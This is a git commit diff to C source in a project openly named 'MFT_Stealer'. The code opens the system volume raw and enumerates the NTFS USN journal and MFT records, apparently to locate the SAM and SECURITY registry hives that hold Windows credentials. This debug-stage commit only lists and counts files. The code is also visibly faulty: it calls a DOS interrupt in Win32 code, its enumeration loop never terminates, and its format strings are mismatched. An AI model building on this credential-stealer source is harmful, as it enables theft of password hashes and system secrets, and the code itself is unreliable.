c944d7e80acf8883a663f4ae5eab41acdd0b2600
MaKiPL <makipol@gmail.com>
2017-03-25 17:57:57 +0100

    enums usn now

--- MFT_Stealer/shneska004.c
+++ MFT_Stealer/shneska004.c
@@ -4,12 +4,16 @@
 
 void outerr(DWORD errmess);
 char rootdriver;
+DWORD CheckFile(USN_RECORD *rec);
+
+ULONG64 filescount = 0;
 
 const wchar_t * sam = L"SAM";
 const wchar_t * sec = L"SECURITY";
 
 int main()
 {
+	MFT_ENUM_DATA_V0 mftenumdata;
 	char * c = getenv("SYSTEMROOT");
 	rootdriver = *c ;
 	wchar_t * py = (wchar_t*)malloc(32);
@@ -17,11 +21,12 @@ int main()
 	HANDLE dev = CreateFile(py, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_NO_BUFFERING, NULL);
 	if (dev == INVALID_HANDLE_VALUE)
 		return -1;
+	printf("1. Device opened\n");
+	//MFT_ENUM_DATA * mftenumdata = malloc(sizeof( MFT_ENUM_DATA));
 	
-	MFT_ENUM_DATA * mftenumdata = malloc(sizeof( MFT_ENUM_DATA));
+	mftenumdata.StartFileReferenceNumber = 0;
+	mftenumdata.LowUsn = 0;
 	
-	mftenumdata->StartFileReferenceNumber = 0;
-	mftenumdata->LowUsn = 0;
 
 	
 	DWORD bufffsz = 1024 * 1024;
@@ -30,21 +35,38 @@ int main()
 	if (!DeviceIoControl(dev, FSCTL_QUERY_USN_JOURNAL, NULL, 0, outbuff, bufffsz, &brre, NULL))
 		outerr(GetLastError());
 
+	printf("2. USN Journal grabbed\n");
+
 	USN_JOURNAL_DATA * jrnl;
 	USN_RECORD *usn;
 	jrnl = (USN_JOURNAL_DATA*)outbuff;
-
-	mftenumdata->LowUsn = jrnl->LowestValidUsn;
-	mftenumdata->HighUsn = jrnl->MaxUsn;
+	mftenumdata.LowUsn = 0;
+	mftenumdata.HighUsn = (USN)jrnl->MaxUsn;
 
 	if (DeviceIoControl(dev, FSCTL_ENUM_USN_DATA, &mftenumdata, sizeof(mftenumdata), outbuff, bufffsz, &brre, NULL))
 	{
 		usn = (USN_RECORD*)outbuff;
-		wprintf("%s", usn->FileName);
+		wprintf("%ws", usn->FileName);
 	}
 	else
 		outerr(GetLastError());
 
+	printf("3. Test ENUM USN jrnl success!\n\tEnumerating USN\n");
+
+	while (1)
+	{
+
+		if (DeviceIoControl(dev, FSCTL_ENUM_USN_DATA, &mftenumdata, sizeof(mftenumdata), outbuff, bufffsz, &brre, NULL))
+		{
+			usn = (USN_RECORD*)outbuff;
+			if (CheckFile(usn))
+				break;
+			else
+				mftenumdata.StartFileReferenceNumber = *((DWORDLONG*)outbuff);
+		}
+		else
+			outerr(GetLastError());
+	}
 
 
     return 0;
@@ -55,5 +77,21 @@ void outerr(DWORD errmess)
 	char * p = malloc(10);
 	sprintf(p,"ERROR: %u", errmess);
 	OutputDebugStringA(p);
+	__asm {
+		MOV AH, 01h
+		INT 21h
+	}
 }
 
+DWORD CheckFile(USN_RECORD *rec) //DEBUG version
+{
+	__asm
+	{
+		INC [filescount]
+	}
+	if (rec->FileName)
+	{
+		printf("%s", rec->FileName);
+	}
+		return 0;
+}
